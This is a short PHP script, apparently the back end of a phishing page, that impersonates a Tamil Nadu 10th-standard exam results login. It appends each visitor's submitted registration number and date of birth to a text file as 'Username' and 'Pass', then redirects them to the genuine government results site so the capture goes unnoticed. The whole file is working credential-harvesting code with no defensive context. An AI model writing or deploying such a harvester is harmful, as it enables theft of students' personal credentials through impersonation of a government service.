<?php 
file_put_contents("usernames.txt", "10thresult Username: " . $_POST['regno'] . " Pass: " . $_POST['dob'] ."\n", FILE_APPEND);
header('Location: http://www.tnresults.nic.in/acpter.htm');
exit();
?>
